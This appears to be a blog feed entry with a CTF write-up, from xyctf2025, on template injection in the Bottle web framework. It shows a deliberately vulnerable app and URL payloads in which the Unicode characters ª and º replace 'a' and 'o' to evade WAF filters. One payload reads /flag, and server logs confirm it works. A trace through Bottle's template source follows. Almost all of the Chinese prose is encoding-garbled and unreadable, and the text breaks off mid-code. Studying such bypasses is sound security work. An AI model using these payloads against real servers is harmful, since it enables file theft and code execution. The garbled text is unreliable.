<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>bottleæ¡†æ¶æ–œä½“å­—å¼•å‘çš„sstiæ¨¡æ¿æ³¨å…¥</title>
      <link href="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>xyctf2025é‡åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹</p><p>ç¯å¢ƒå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›®å‰å‘ç°çš„POCåªèƒ½æ›¿æ¢ä¿©å­—ç¬¦ï¼Œåˆ†åˆ«æ˜¯<code>o</code>ï¼Œ<code>a</code>ï¼Œåœ¨bottleçš„SSTIé‡Œï¼Œä»–ä»¬å¯ä»¥è¢«ç›´æ¥æ›¿æ¢æˆ<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)è¿›è€Œç»•è¿‡å„ç§wafã€‚</p><p>è¿™é‡Œç»™å‡ºunicodeå­—ç¬¦è¡¨çš„ç½‘å€ï¼š<a href="https://symbl.cc/cn/unicode-table/#latin-1-supplement">https://symbl.cc/cn/unicode-table/#latin-1-supplement</a></p><hr><p><code>Âª</code>çš„urlç¼–ç æ˜¯<code>%C2%AA</code>ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ä¼ å…¥<code>http://127.0.0.1:5000/attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125;</code>ï¼ŒæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âªbs(-1)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 16:27:04] &quot;GET /attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 400 752</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å»æ‰<code>%C2</code>ï¼Œå‘ç°é¡µé¢æ­£å¸¸å›æ˜¾<code>hello 1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [08/Apr/2025 16:28:01] &quot;GET /attack?payload=&#123;&#123;%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 200 7</span><br><span class="line">&#123;&#123;Âªbs(-1)&#125;&#125;</span><br></pre></td></tr></table></figure><hr><p>ç„¶åæˆ‘ä»¬è¯•è¯•é˜³æ€§åºæ•°æŒ‡ç¤ºç¬¦<code>Âº</code>ã€‚urlç¼–ç æ˜¯<code>%C2%BA</code>ã€‚è‹¥æˆ‘ä»¬ç›´æ¥ä¼ å…¥<code>http://192.168.79.128:5000/attack?payload=&#123;&#123;%C2%BApen(%27/flag%27).read()&#125;&#125;</code>ï¼Œå®¢æˆ·ç«¯æŠ¥é”™ï¼ŒæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âºpen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">192.168.79.1 - - [08/Apr/2025 16:40:48] &quot;GET /attack?payload=&#123;&#123;%C2%BApen(%27/flag%27).read()&#125;&#125; HTTP/1.1&quot; 400 768</span><br></pre></td></tr></table></figure><p>å»æ‰<code>%C2</code>ï¼Œå‘ç°okå•¦ã€‚<code>http://192.168.79.128:5000/attack?payload=&#123;&#123;%BApen(%27/flag%27).read()&#125;&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âºpen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">192.168.79.1 - - [08/Apr/2025 16:42:17] &quot;GET /attack?payload=&#123;&#123;%BApen(%27/flag%27).read()&#125;&#125; HTTP/1.1&quot; 200 30</span><br></pre></td></tr></table></figure><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬æ·±å…¥ä»£ç çœ‹çœ‹ï¼Œä¸ªäººè®¤ä¸ºbottleæºç çœ‹ç€è¿˜æ˜¯å¾ˆèˆ’æœçš„ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬è·Ÿè¿›<code>bottle.template()</code>çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get a rendered template as a string iterator.</span></span><br><span class="line"><span class="string">    You can use a name, a filename or a template string as first parameter.</span></span><br><span class="line"><span class="string">    Template rendering arguments can be passed as dictionaries</span></span><br><span class="line"><span class="string">    or directly (as keyword arguments).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦å°±æ˜¯æŒ‡å®šæ¨¡æ¿å¼•æ“å’Œæ¨¡æ¿æ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚è¿˜æœ‰ä¸‹é¢çš„æ¨¡æ¿ç¼“å­˜æœºåˆ¶ï¼š</p><blockquote><ol><li><strong>ç¼“å­˜é€»è¾‘</strong>ï¼šå¦‚æœæ¨¡æ¿æœªç¼“å­˜æˆ–å¤„äºè°ƒè¯•æ¨¡å¼ï¼ˆ<code>DEBUG=True</code>ï¼‰ï¼Œåˆ™é‡æ–°åŠ è½½æ¨¡æ¿ã€‚<ul><li><strong>ç›´æ¥ä½¿ç”¨æ¨¡æ¿å¯¹è±¡</strong>ï¼šå¦‚æœ <code>tpl</code> å·²ç»æ˜¯é€‚é…å™¨å®ä¾‹ï¼Œç›´æ¥ç¼“å­˜ã€‚</li><li><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong>ï¼šå¦‚æœåŒ…å«æ¢è¡Œç¬¦æˆ–æ¨¡æ¿è¯­æ³•ç¬¦å·ï¼ˆ<code>&#123;</code>, <code>%</code>, <code>$</code>ï¼‰ï¼Œè§†ä¸ºæ¨¡æ¿å­—ç¬¦ä¸²ã€‚</li><li><strong>æ¨¡æ¿æ–‡ä»¶</strong>ï¼šå¦åˆ™è§†ä¸ºæ–‡ä»¶åï¼Œä» <code>lookup</code> è·¯å¾„åŠ è½½ã€‚</li></ul></li></ol></blockquote><p>è¯†åˆ«å‡ºæ¨¡æ¿æ ‡è¯†ç¬¦åå°†å…¶è§†ä¸ºæ¨¡æ¿å­—ç¬¦ä¸²ï¼Œå†äº¤ç»™<code>adapter</code>ï¼Œä¹Ÿå°±æ˜¯<code>SimpleTemplate</code>ã€‚ä½¿ç”¨<code>render()</code>ä½œä¸ºå…¥å£å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Render the template using keyword arguments as local variables. &quot;&quot;&quot;</span></span><br><span class="line">    env = &#123;&#125;</span><br><span class="line">    stdout = []</span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args:</span><br><span class="line">        env.update(dictarg)</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    <span class="variable language_">self</span>.execute(stdout, env)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(stdout)</span><br></pre></td></tr></table></figure><p>ç”¨ <code>env.update()</code> æŠŠæ‰€æœ‰ä½ç½®å‚æ•°ï¼ˆ<code>*args</code>ï¼‰åˆå¹¶è¿› <code>env</code> ä¸­ï¼›æŠŠå…³é”®å­—å‚æ•°ï¼ˆ<code>**kwargs</code>ï¼‰ä¹ŸåŠ å…¥åˆ° <code>env</code> ä¸­ï¼›æœ€åè°ƒç”¨å½“å‰ç±»çš„<code>execute</code>æ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, _stdout, kwargs</span>):</span><br><span class="line">    env = <span class="variable language_">self</span>.defaults.copy()</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    env.update(&#123;</span><br><span class="line">        <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">        <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">        <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">        <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">        <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">        <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">        <span class="string">&#x27;get&#x27;</span>: env.get,</span><br><span class="line">        <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">        <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="variable language_">self</span>.co, env)</span><br><span class="line">    <span class="keyword">if</span> env.get(<span class="string">&#x27;_rebase&#x27;</span>):</span><br><span class="line">        subtpl, rargs = env.pop(<span class="string">&#x27;_rebase&#x27;</span>)</span><br><span class="line">        rargs[<span class="string">&#x27;base&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(_stdout)  <span class="comment">#copy stdout</span></span><br><span class="line">        <span class="keyword">del</span> _stdout[:]  <span class="comment"># clear stdout</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._include(env, subtpl, **rargs)</span><br><span class="line">    <span class="keyword">return</span> env</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨execçš„å…¨å±€å˜é‡é‡Œå®šä¹‰äº†ä¸€ä¸ª<code>_escape</code>å’Œ<code>_printlist</code>å‡½æ•°ã€‚</p><p>æ¨¡æ¿ä»£ç çš„æ‰§è¡Œå…¶å®å°±æ˜¯åœ¨<code> exec(self.co, env)</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹<code>self.co</code>ï¼ˆå³è¦æ‰§è¡Œçš„ä»£ç ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@cached_property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">co</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">compile</span>(<span class="variable language_">self</span>.code, <span class="variable language_">self</span>.filename <span class="keyword">or</span> <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>@cached_property</code>å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªä¼˜åŒ–æœºåˆ¶ï¼Œç”¨æ¥é¿å…é‡å¤è®¡ç®—ã€‚</p><p>è¿›è¡Œäº†ä¸€æ¬¡compileï¼ˆç¼–è¯‘ï¼‰ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿè¿›<code>self.code</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">self</span>):</span><br><span class="line">    source = <span class="variable language_">self</span>.source</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> source:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            source = f.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source, encoding = touni(source), <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeError:</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">11</span>, <span class="string">&#x27;Unsupported template encodings.&#x27;</span>, <span class="string">&#x27;Use utf-8 for templates.&#x27;</span>)</span><br><span class="line">    parser = StplParser(source, encoding=encoding, syntax=<span class="variable language_">self</span>.syntax)</span><br><span class="line">    code = parser.translate()</span><br><span class="line">    <span class="variable language_">self</span>.encoding = parser.encoding</span><br><span class="line">    <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨tryé‡Œé¢ï¼Œtouniçš„ä¸‹æ–¹åŠ ä¸€ä¸ª<code>print(source)</code></p><p>å½“æˆ‘ä»¬ä¼ å…¥ä»¥ä¸‹å‚æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹çœ‹æœåŠ¡ç«¯print</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;hello%20world&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408172108822.png" class="" title="This is an example image"><p>å‘ç°è¿™é‡Œçš„sourceå…¶å®å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚</p><p>è·Ÿè¿›touniçœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s.decode(enc, err)</span><br><span class="line">    <span class="keyword">return</span> unicode(<span class="string">&quot;&quot;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> s)</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯å­—èŠ‚ç±»å‹çš„ï¼Œdecodeåreturnï¼Œå¦åˆ™returnä¸€ä¸ª<code>unicode(&quot;&quot; if s is None else s)</code>ï¼Œç„¶åæˆ‘ä»¬çœ‹çœ‹unicodeçš„å®šä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode = str</span><br></pre></td></tr></table></figure><p>unicodeæ˜¯ä¸€ä¸ªstrç±»ï¼Œå…¨ä½“strï¼</p><p>ç„¶åæˆ‘ä»¬å†å›åˆ°<code>code()</code>æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parser = StplParser(source, encoding=encoding, syntax=<span class="variable language_">self</span>.syntax)</span><br><span class="line">code = parser.translate()</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ä¸€ä¸‹<code>StplParser</code>çš„<code>translete</code>æ–¹æ³•ã€‚<code>StplParser</code> ç±»æ˜¯ç”¨æ¥è§£æå’Œè½¬æ¢æŸç§æ¨¡æ¿æˆ–æºä»£ç çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.offset: <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Parser is a one time instance.&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = <span class="variable language_">self</span>.re_split.search(<span class="variable language_">self</span>.source, pos=<span class="variable language_">self</span>.offset)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            text = <span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:m.start()]</span><br><span class="line">            <span class="variable language_">self</span>.text_buffer.append(text)</span><br><span class="line">            <span class="variable language_">self</span>.offset = m.end()</span><br><span class="line">            <span class="keyword">if</span> m.group(<span class="number">1</span>):  <span class="comment"># Escape syntax</span></span><br><span class="line">                line, sep, _ = <span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:].partition(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.text_buffer.append(<span class="variable language_">self</span>.source[m.start():m.start(<span class="number">1</span>)] +</span><br><span class="line">                                        m.group(<span class="number">2</span>) + line + sep)</span><br><span class="line">                <span class="variable language_">self</span>.offset += <span class="built_in">len</span>(line + sep)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="variable language_">self</span>.flush_text()</span><br><span class="line">            <span class="variable language_">self</span>.offset += <span class="variable language_">self</span>.read_code(<span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:],</span><br><span class="line">                                          multiline=<span class="built_in">bool</span>(m.group(<span class="number">4</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="variable language_">self</span>.text_buffer.append(<span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:])</span><br><span class="line">    <span class="variable language_">self</span>.flush_text()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.code_buffer)</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸»è¦å°±æ˜¯å°†æ¨¡æ¿&#x2F;è‡ªå®šä¹‰è¯­æ³•è½¬æ¢ä¸ºå¯æ‰§è¡Œä»£ç ï¼ˆå¦‚ Pythonï¼‰ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨çš„æ˜¯<code>self.flush_text()</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ã€‚</p><ul><li><strong><code>flush_text()</code></strong>: å°† <code>text_buffer</code> ä¸­çš„æ™®é€šæ–‡æœ¬è½¬æ¢ä¸ºç›®æ ‡ä»£ç ï¼ˆå¦‚ Python çš„ <code>print()</code> è¯­å¥ï¼‰ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flush_text</span>(<span class="params">self</span>):</span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.text_buffer)</span><br><span class="line">    <span class="keyword">del</span> <span class="variable language_">self</span>.text_buffer[:]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text: <span class="keyword">return</span></span><br><span class="line">    parts, pos, nl = [], <span class="number">0</span>, <span class="string">&#x27;\\\n&#x27;</span> + <span class="string">&#x27;  &#x27;</span> * <span class="variable language_">self</span>.indent</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="variable language_">self</span>.re_inl.finditer(text):</span><br><span class="line">        prefix, pos = text[pos:m.start()], m.end()</span><br><span class="line">        <span class="keyword">if</span> prefix:</span><br><span class="line">            parts.append(nl.join(<span class="built_in">map</span>(<span class="built_in">repr</span>, prefix.splitlines(<span class="literal">True</span>))))</span><br><span class="line">        <span class="keyword">if</span> prefix.endswith(<span class="string">&#x27;\n&#x27;</span>): parts[-<span class="number">1</span>] += nl</span><br><span class="line">        parts.append(<span class="variable language_">self</span>.process_inline(m.group(<span class="number">1</span>).strip()))</span><br><span class="line">    <span class="keyword">if</span> pos &lt; <span class="built_in">len</span>(text):</span><br><span class="line">        prefix = text[pos:]</span><br><span class="line">        lines = prefix.splitlines(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> lines[-<span class="number">1</span>].endswith(<span class="string">&#x27;\\\\\n&#x27;</span>): lines[-<span class="number">1</span>] = lines[-<span class="number">1</span>][:-<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">elif</span> lines[-<span class="number">1</span>].endswith(<span class="string">&#x27;\\\\\r\n&#x27;</span>): lines[-<span class="number">1</span>] = lines[-<span class="number">1</span>][:-<span class="number">4</span>]</span><br><span class="line">        parts.append(nl.join(<span class="built_in">map</span>(<span class="built_in">repr</span>, lines)))</span><br><span class="line">    code = <span class="string">&#x27;_printlist((%s,))&#x27;</span> % <span class="string">&#x27;, &#x27;</span>.join(parts)</span><br><span class="line">    <span class="variable language_">self</span>.lineno += code.count(<span class="string">&#x27;\n&#x27;</span>) + <span class="number">1</span></span><br><span class="line">    <span class="variable language_">self</span>.write_code(code)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åœ¨codeä¸‹æ–¹åŠ ä¸€ä¸ª<code>print(code)</code></p><p>æˆ‘ä»¬è®¿é—®<code>http://127.0.0.1:5000/attack?payload=hello&#123;&#123;hello%20world&#125;&#125;</code>ï¼ŒæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello&#123;&#123;hello world&#125;&#125;</span><br><span class="line">_printlist((&#x27;hello hello&#x27;, _escape(hello world),))</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª_printlistå°±æ˜¯åœ¨execæ‰§è¡Œçš„å…¨å±€ç©ºé—´é‡Œçš„æ‰“å°å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">env.update(&#123;</span><br><span class="line">            <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">            <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">            <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">            <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">            <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            